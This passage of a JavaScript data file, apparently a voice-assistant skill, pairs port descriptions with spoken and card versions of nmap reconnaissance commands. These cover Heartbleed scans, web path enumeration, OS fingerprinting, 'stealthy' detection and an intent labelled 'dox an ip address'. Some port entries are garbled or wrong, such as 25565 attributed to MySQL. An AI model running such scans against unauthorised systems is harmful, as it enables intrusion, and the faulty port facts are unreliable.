	"989" : "Port 989 TCP or UDP is FTPS Protocol for data or FTP over TLS.",    
	"990" : "Port 990 TCP or UDP is FTPS protocol for control or FTP over TLS.",    
	"991" : "Port 991 TCP or UDP is Net News Administration System or N.A.S.",
	"992" : "Port 992 TCP is UDP is Telnet protocol over TLS.",
	"993" : "Port 993 TCP is Internet Message Access Protocol over TLS. Otherwise known as I-MAPS",
	"994" : "Port 994 TCP or UDP is IRC over TLS.",
	"995" : "Port 995 TCP Post Office Protocol 3 or POPS-3 over TLS.",    
	"999" : "Port 999 TCP Sciamore-DB Database System.",
	"1010" : "Port 1010 TCP is ThinLinc web-based admin interface.",
	"1023" : "Port 1023 TCP or UDP is Reserved.",
	// Registered ports or turn up a port query server for this function...
	"1024" : "Port 1024 is reserved.",
	"1025" : "Port 1025 TCP is reserved.",
	"1027" : "Port 1027 UDP is Native IP-v6 behind IP-v4-to-IP-v4 NAT.",
	"1028" : "Port 1028 is deprecated.",
	"2949" : "Port is WAP push secure multimedia messaging service.",
	"9001" : "Port 9001 TCP is used for Share Point, or Cisco router configuration, or Tor, or DBG proxy, or H SQL DB, and port 9001 TCP and UDP is used by ETL Service Manager",
	"9150" : "Port 9150 is Tor.",
	"11001" : "Port 11 001 TCP and UDP is used by meta sys or Johnson Controls Metasys java AC controls",
	"25565" : "Port 25 5 65 TCP is used by My SQL and also by MineCraft",
	"49151" : "Port 49 1 51 TCP and UDP is reserved.",
	"43594" : "Port 43 5 94 through 43 5 49 TCP and UDP is RuneScape."
} };

const nmap = { "NMAP_EN_US" : {
	"normal": {"speech" : "<prosody rate='95%'>n map 192.168.1.1 </prosody>of course change the IP to your desired target.", "card" : "nmap 192.168.1.1"},
	"find information on an ip address": {"speech" : "at the command prompt, enter, <prosody rate='95%'> n map space dash dash script equal-sign ASN dash query comma whois comma I P dash geolocation dash max-mind space 192.168.1.0 forward slash 24</prosody> Of course, you should replace the 192 address with your intended address</prosody>.", "card" : "Example of an IP address lookup with NMAP \\ nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24"},
	"find ip information": {"speech" : "at the command prompt, enter <prosody rate='95%'> n map space dash dash script equal-sign ASN dash query comma whois comma I P dash geolocation dash max-mind space 192.168.1.0 forward slash 24</prosody>. You should replace the 192 address with the address you are searching for</prosody>.", "card" : "Example of an IP address lookup with NMAP \\ nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24"},
	"find information about an ip address": {"speech" : "at the command prompt, enter <prosody rate='95%'> n map space dash dash script equal-sign ASN dash query comma whois comma I P dash geolocation dash max-mind space 192.168.1.0 forward slash 24. You should replace the 192 address with the address you are searching for</prosody>.", "card" : "Example of an IP address lookup with NMAP \\ nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24"},
	"lookup an ip address": {"speech" : "at the command prompt, enter <prosody rate='95%'> n map space dash dash script equal-sign ASN dash query comma whois comma I P dash geolocation dash max-mind space 192.168.1.0 forward slash 24. You should replace the 192 address with the address you are searching for</prosody>.", "card" : "Example of an IP address lookup with NMAP \\ nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24"},
	"dox an ip address": {"speech" : "at the command prompt, enter <prosody rate='95%'> n map space dash dash script equal-sign ASN dash query comma whois comma I P dash geolocation dash max-mind space 192.168.1.0 forward slash 24. You should replace the 192 address with the address you are searching for</prosody>.", "card" : "Example of an IP address lookup with NMAP \\ nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24"},
	// heart bleed
	"check for heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  <prosody rate='95%'>n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  <prosody rate='95%'>n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"test for heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  <prosody rate='95%'>n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"scan for heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  <prosody rate='95%'>n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"detect heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  <prosody rate='95%'>n map dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"find heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  <prosody rate='95%'>n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},
	"look for heart bleed": {"speech" : "You can scan for Heart Bleed with the following command line.  <prosody rate='95%'>n map space dash s uppercase V space dash p space 443 space dash dash script = s s l dash heartbleed space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24"},	
	// get HTTP page titles
	"get page titles from http": {"speech" : "at the command prompt, enter <prosody rate='95%'> n map space dash dash script=http dash title space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-title 192.168.1.0/24"},
	"get http data": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash title space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-title 192.168.1.0/24"},
	"scan for http": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash title space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-title 192.168.1.0/24"},
	"scan for http data": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash title space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-title 192.168.1.0/24"},
	// http header scan<prosody rate='95%'>
	"get http headers": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash headers 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-headers 192.168.1.0/24"},
	"get web headers": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash headers 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-headers 192.168.1.0/24"},
	"return http headers": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash headers 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-headers 192.168.1.0/24"},
	"enumerate web app paths": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash enum 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-enum 192.168.1.0/24"},
	// http path scan
	"list web app paths": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash enum space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-enum 192.168.1.0/24"},
	"show web app paths": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash enum space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-enum 192.168.1.0/24"},
	"find web app paths": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash enum space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-enum 192.168.1.0/24"},
	"find web site paths": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash enum space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-enum 192.168.1.0/24"},
	"show web site paths": {"speech" : "at the command prompt, enter <prosody rate='95%'>n map space dash dash script=http dash enum space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap --script=http-enum 192.168.1.0/24"},
	// list NSE scripts
	"find out what nse scripts are installed": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"find out what n s e scripts are installed": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"find out which nse scripts are installed": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"find out which n s e scripts are installed": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"find which nse scripts are installed": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"find installed nse scripts": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"find installed n. s. e. scripts": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"find installed n s e scripts": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"nse scripts": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"n s e scripts": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"list installed scripts": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"list nse scripts": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	"list n s e scripts": {"speech" : "<prosody rate='95%'>locate space nse space pipe space grep space script</prosody>", "card" : "locate nse | grep script"},
	// save scan
	"scan using safe scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V dash s upper-case C space 192.168.1.1</prosody>", "card" : "nmap -sV -sC 192.168.1.1"},
	"do a scan using safe scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V dash s upper-case C space 192.168.1.1</prosody>", "card" : "nmap -sV -sC 192.168.1.1"},
	"use safe scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V dash s upper-case C space 192.168.1.1</prosody>", "card" : "nmap -sV -sC 192.168.1.1"},
	"do a safe scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V dash s upper-case C space 192.168.1.1</prosody>", "card" : "nmap -sV -sC 192.168.1.1"},
	"safe scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V dash s upper-case C space 192.168.1.1</prosody>", "card" : "nmap -sV -sC 192.168.1.1"},
	"do a scan without crashing anything": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V dash s upper-case C space 192.168.1.1</prosody>", "card" : "nmap -sV -sC 192.168.1.1"},
	"do a scan without crashing servers": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V dash s upper-case C space 192.168.1.1</prosody>", "card" : "nmap -sV -sC 192.168.1.1"},
	// get help
	"get help for a script": {"speech" : "If you wanted help for the heart bleed script you would enter <prosody rate='95%'>n map dash dash script dash help equal sign ssl-heartbleed</prosody>", "card" : "nmap --script-help=ssl-heartbleed"},
	"get help on a script": {"speech" : "If you wanted help for the heart bleed script you would enter <prosody rate='95%'>n map dash dash script dash help equal sign ssl-heartbleed</prosody>", "card" : "nmap --script-help=ssl-heartbleed"},
	"get help": {"speech" : "If you wanted help for the heart bleed script you would enter <prosody rate='95%'>n map dash dash script dash help equal sign ssl-heartbleed</prosody>", "card" : "nmap --script-help=ssl-heartbleed"},
	// nse scripts
	"scan using an nse script": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash p space 443 space dash script equals s s l dash heart bleed dot n s e space 192.168.1.1</prosody>", "card" : "nmap -sV -p 443 –script=ssl-heartbleed.nse 192.168.1.1"},
	"scan with a nse script": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash p space 443 space dash script equals s s l dash heart bleed dot n s e space 192.168.1.1</prosody>", "card" : "nmap -sV -p 443 –script=ssl-heartbleed.nse 192.168.1.1"},
	"scan with a script": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash p space 443 space dash script equals s s l dash heart bleed dot n s e space 192.168.1.1</prosody>", "card" : "nmap -sV -p 443 –script=ssl-heartbleed.nse 192.168.1.1"},
	// scan with a set of scripts
	"scan with a set of scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1</prosody>", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"scan with related scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1</prosody>", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use a set of scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1</prosody>", "card" : "nmap -sV --script=smb* 192.168.1.1"},
//	"use a set of n. s. e. scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1</prosody>", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use a set of n s e scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1</prosody>", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use a set of nse scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1</prosody>", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use related scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1</prosody>", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use related nse scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1</prosody>", "card" : "nmap -sV --script=smb* 192.168.1.1"},
//	"use related n. s. e. scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1</prosody>", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	"use related n s e scripts": {"speech" : "<prosody rate='95%'>n map space dash s upper-case v space dash dash script = S M B star space 192.168.1.1</prosody>", "card" : "nmap -sV --script=smb* 192.168.1.1"},
	// save
	"save output to a file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case N space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save scan output to a file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case N space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save scan to a file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case N space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save scan detail to a file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case N space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save results to a file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case N space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save data to a file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case N space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save scan detail": {"speech" : "<prosody rate='95%'>n map space dash o upper-case N space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save scan output": {"speech" : "<prosody rate='95%'>n map space dash o upper-case N space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"save a scan to a file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case N space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oN outputfile.txt 192.168.1.1"},
	"and save to a file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case N space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oN outputfile.txt 192.168.1.1"},

	// save to greppable file
	"save output to a greppable file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case G space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan output to a greppable file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case G space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan to a greppable file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case G space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan detail to a greppable file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case G space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save results to a greppable file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case G space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save data to a greppable file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case G space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan detail in grep format": {"speech" : "<prosody rate='95%'>n map space dash o upper-case G space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan output in grep format": {"speech" : "<prosody rate='95%'>n map space dash o upper-case G space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save a scan to a greppable file": {"speech" : "<prosody rate='95%'>n map space dash o upper-case G space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save results for grepping": {"speech" : "<prosody rate='95%'>n map space dash o upper-case G space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	"save scan results for grep": {"speech" : "<prosody rate='95%'>n map space dash o upper-case G space outputfile.txt space 192.168.1.1</prosody>", "card" : "nmap -oG outputfile.txt 192.168.1.1"},
	// xml
	"save results to xml": {"speech" : "<prosody rate='95%'>n map space dash o upper-case X space outfile.xml space 192.168.1.1</prosody>", "card" : "nmap -oX outputfile.xml 192.168.1.1"},
	"save results in all formats": {"speech" : "<prosody rate='95%'>n map space dash o upper-case A space outfile.xml space 192.168.1.1</prosody>", "card" : "nmap -oA outputfile 192.168.1.1"},
	"save scan results to xml": {"speech" : "<prosody rate='95%'>n map space dash o upper-case X space outfile.xml space 192.168.1.1</prosody>", "card" : "nmap -oX outputfile.xml 192.168.1.1"},
	"save scan results in all formats": {"speech" : "<prosody rate='95%'>n map space dash o upper-case A space outfile.xml space 192.168.1.1</prosody>", "card" : "nmap -oA outputfile 192.168.1.1"},
	// detect OS fingerprint
	"detect operating system and services": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"detect operating system": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"detect os and services": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"os fingerprint scan": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"os and service fingerprint scan": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"os and service fingerprint": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"os and service fingerprinting": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"do os and service fingerprint": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"do fingerprint scan": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"do an os fingerprint scan": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"detect o. s. and services": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"detect o s and services": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"o s fingerprint scan": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"o s and service fingerprint scan": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"o s and service fingerprint": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"o s and service fingerprinting": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"do o s and service fingerprint": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	"do an o s fingerprint scan": {"speech" : "<prosody rate='95%'>n map space dash upper-case A space 192.168.1.1</prosody>", "card" : "nmap -A 192.168.1.1"},
	// service detection
	"standard service detection": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"service detection": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"service scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"service": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"services": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"for services": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"do a service detection scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"do a service detect": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"do a service detect scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"do service fingerprint scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"do a service fingerprint scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"service fingerprint scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"scan for services": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	"scan and fingerprint services": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space 192.168.1.1</prosody>", "card" : "nmap -sV 192.168.1.1"},
	// aggressive service detect
	"aggressive service detection": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"noisy service detection": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"noisy service fingerprint": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"noisy service fingerprinting": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do a noisy service fingerprint": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do a noisy service scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do an aggressive service detection scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do an aggressive service detect": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do an aggressive service fingerprint": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do an aggressive service detect scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do an aggressive service fingerprint scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do aggressive service fingerprinting": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"scan aggressively for services": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"scan aggressive and fingerprint services": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	// light service detection
	"light service detection": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"stealthy service detection": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"light service detection scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"stealthy service detection scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"quiet service detection": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"quiet service detection scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"light service scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"stealthy service scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1</prosody>", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	// tcp connect full
	"scan using tcp connect": {"speech" : "<prosody rate='95%'>n map space dash s upper-case T space 192.168.1.1</prosody>", "card" : "nmap -sT 192.168.1.1"},
	"scan using full tcp connect": {"speech" : "<prosody rate='95%'>n map space dash s upper-case T space 192.168.1.1</prosody>", "card" : "nmap -sT 192.168.1.1"},
	"tcp connect scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case T space 192.168.1.1</prosody>", "card" : "nmap -sT 192.168.1.1"},
	"full tcp connect scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case T space 192.168.1.1</prosody>", "card" : "nmap -sT 192.168.1.1"},
	"scan using t c p connect": {"speech" : "<prosody rate='95%'>n map space dash s upper-case T space 192.168.1.1</prosody>", "card" : "nmap -sT 192.168.1.1"},
	"scan using full t c p connect": {"speech" : "<prosody rate='95%'>n map space dash s upper-case T space 192.168.1.1</prosody>", "card" : "nmap -sT 192.168.1.1"},
	"t c p connect scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case T space 192.168.1.1</prosody>", "card" : "nmap -sT 192.168.1.1"},
	"full t c p connect scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case T space 192.168.1.1</prosody>", "card" : "nmap -sT 192.168.1.1"},
	"full connect scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case T space 192.168.1.1</prosody>", "card" : "nmap -sT 192.168.1.1"},
	// syn
	"scan using syn": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
